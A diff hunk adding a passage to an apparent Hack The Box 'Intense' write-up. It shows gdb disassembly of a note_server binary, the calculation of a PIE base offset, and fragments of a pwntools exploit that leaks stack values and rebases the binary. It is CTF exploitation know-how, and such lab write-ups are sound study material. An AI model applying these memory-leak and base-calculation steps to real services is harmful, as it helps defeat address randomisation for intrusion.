@@ -1112,6 +1112,44 @@ then:
 ezi0x00@kali:~/HTB/Intense$ base64 -di libc.b64 > libc
 ezi0x00@kali:~/HTB/Intense$ base64 -di note_server.b64 > note_server
 ```
+Now we want the new `PIE` base server specific to do that after got a `note_server` debug it not local was compiled on local.
+We don't need to repeat the previous steps to get the return address, just look at the main function
+```shell
+ezi0x00@kali:~/HTB/Intense$ gdb note_server -ex 'disassemble main'
+......snip......
+   0x0000000000000f4f <+517>:   call   0xb0a <handle_client>
+   0x0000000000000f54 <+522>:   mov    edi,0x0
+   0x0000000000000f59 <+527>:   call   0x9c0 <exit@plt>
+   0x0000000000000f5e <+532>:   mov    eax,DWORD PTR [rbp-0xc8]
+   0x0000000000000f64 <+538>:   mov    edi,eax
+   0x0000000000000f66 <+540>:   call   0x930 <close@plt>
+   0x0000000000000f6b <+545>:   jmp    0xec4 <main+378>
+End of assembler dump.
+gef➤  
+```
+The return address is at an offset of `0xf54` from the base
+just you can see `vmmap` and do it: 
+start offset - libc find 
+```shell
+ezi0x00@kali:~/HTB/Intense$ python 
+Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
+[GCC 9.3.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print(hex(0x0000555555554000-0x555555554f54))
+-0xf54
+>>> 
+```
+find libc we did it in exploit code 
+```
+rbp = u64(p.recv(8))
+ret = u64(p.recv(8))
+base = u64(p.recv(8))
+log.success(f"Return: {hex(ret)}")
+```
+Now change `0x1674` to `0xf54` 
+```
+e.address = ret - 0xf54
+```
 The decisive moment has come
 ```shell
 ezi0x00@kali:~/HTB/Intense$ python3 exploit.py 
